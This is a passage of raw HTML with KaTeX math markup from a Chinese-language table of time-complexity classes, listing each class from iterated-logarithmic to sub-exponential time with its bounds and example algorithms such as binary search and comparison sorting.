style="text-align:center"></td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><msup><mi>g</mi><mo>∗</mo></msup><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(log^* n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></td><td style="text-align:center"></td><td style="text-align:center">分布式圆环着色问题</td></tr><tr><td>对数对数时间</td><td style="text-align:center"></td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(log log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></td><td style="text-align:center"></td><td style="text-align:center">有界优先队列的单个操作</td></tr><tr><td>对数时间</td><td style="text-align:center">DLOGTIME</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">log n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">n</span></span></span></span>, <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mi>o</mi><mi>g</mi><msup><mi>n</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">log n^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0085em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></td><td style="text-align:center">二分搜索</td></tr><tr><td>幂对数时间</td><td style="text-align:center"></td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><msup><mo stretchy="false">)</mo><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></msup></mrow><annotation encoding="application/x-tex">(log n)^{O(1)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.138em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">n</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">O</span><span class="mopen mtight">(</span><span class="mord mtight">1</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span></span></span></span></td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">(log n)^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">n</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></td><td style="text-align:center"></td></tr><tr><td>（小于1次）幂时间</td><td style="text-align:center"></td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mi>c</mi></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^c)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">c</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，其中<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>&lt;</mo><mi>c</mi><mo>&lt;</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">0 &lt; c &lt; 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6835em;vertical-align:-0.0391em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span></td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>n</mi><mfrac><mn>1</mn><mn>2</mn></mfrac></msup></mrow><annotation encoding="application/x-tex">n^\frac {1}{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.954em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.954em;"><span style="top:-3.363em;margin-right:0.05em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8443em;"><span style="top:-2.656em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.2255em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line mtight" style="border-bottom-width:0.049em;"></span></span><span style="top:-3.384em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.344em;"><span></span></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"></span></span></span></span></span></span></span></span></span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>n</mi><mfrac><mn>2</mn><mn>3</mn></mfrac></msup></mrow><annotation encoding="application/x-tex">n^ \frac{2}{3}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.954em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.954em;"><span style="top:-3.363em;margin-right:0.05em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8443em;"><span style="top:-2.656em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span><span style="top:-3.2255em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line mtight" style="border-bottom-width:0.049em;"></span></span><span style="top:-3.384em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.344em;"><span></span></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"></span></span></span></span></span></span></span></span></span></span></span></span></td><td style="text-align:center">K-d树的搜索操作</td></tr><tr><td>线性时间</td><td style="text-align:center"></td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span></td><td style="text-align:center">无序数组的搜索</td></tr><tr><td>线性迭代对数时间</td><td style="text-align:center"></td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mi>l</mi><mi>o</mi><msup><mi>g</mi><mo>∗</mo></msup><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n log^* n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></td><td style="text-align:center"></td><td style="text-align:center">莱姆德·赛德尔的三角分割多边形算法</td></tr><tr><td>线性对数时间</td><td style="text-align:center"></td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">nlog n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">n</span></span></span></span>, <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><mo stretchy="false">!</mo></mrow><annotation encoding="application/x-tex">log n!</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">n</span><span class="mclose">!</span></span></span></span></td><td style="text-align:center">最快的比较排序</td></tr><tr><td>二次时间</td><td style="text-align:center"></td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>n</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">n^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></td><td style="text-align:center">冒泡排序、插入排序</td></tr><tr><td>三次时间</td><td style="text-align:center"></td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>3</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^3)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>n</mi><mn>3</mn></msup></mrow><annotation encoding="application/x-tex">n^3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span></span></span></span></td><td style="text-align:center">矩阵乘法的基本实现，计算部分相关性</td></tr><tr><td>多项式时间</td><td style="text-align:center">P</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><mo stretchy="false">)</mo></mrow></msup><mo>=</mo><msup><mi>n</mi><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></msup></mrow><annotation encoding="application/x-tex">2^{O(log n)} = n^{O(1)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.888em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">O</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span><span class="mord mathnormal mtight">n</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.888em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">O</span><span class="mopen mtight">(</span><span class="mord mtight">1</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span></span></span></span></td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">n log n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">n</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>n</mi><mn>10</mn></msup></mrow><annotation encoding="application/x-tex">n^{10}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">10</span></span></span></span></span></span></span></span></span></span></span></span></td><td style="text-align:center">线性规划中的卡马卡算法，AKS质数测试</td></tr><tr><td>准多项式时间</td><td style="text-align:center">QP</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mrow><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><msup><mo stretchy="false">)</mo><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></msup></mrow></msup></mrow><annotation encoding="application/x-tex">2^{(logn)^{O(1)}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0397em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.0397em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span><span class="mord mathnormal mtight">n</span><span class="mclose mtight"><span class="mclose mtight">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9667em;"><span style="top:-2.9667em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5357em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">O</span><span class="mopen mtight">(</span><span class="mord mtight">1</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></td><td style="text-align:center"></td><td style="text-align:center">关于有向斯坦纳树问题最著名的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><msup><mi>g</mi><mn>2</mn></msup><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(log^2n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>近似算法</td></tr><tr><td>次指数时间（第一定义）</td><td style="text-align:center">SUBEXP</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mn>2</mn><msup><mi>n</mi><mi>ϵ</mi></msup></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(2^{n^\epsilon})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.13em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.88em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7385em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">ϵ</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，对任意的ε &gt; 0</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mn>2</mn><mrow><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><msup><mo stretchy="false">)</mo><mrow><mi>l</mi><mi>o</mi><mi>g</mi><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi></mrow></msup></mrow></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(2^{(logn)^{loglogn}})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2619em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.0119em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span><span class="mord mathnormal mtight">n</span><span class="mclose mtight"><span class="mclose mtight">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.927em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></td><td style="text-align:center">假设复杂性理论推测，BPP包含在 SUBEXP 中。</td></tr><tr><td>次指数时间（第二定义）</td><td style="text-align:center"></td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mrow><mi>o</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></msup></mrow><annotation encoding="application/x-tex">2^{o(n)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.888em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">n</span><span class="mclose 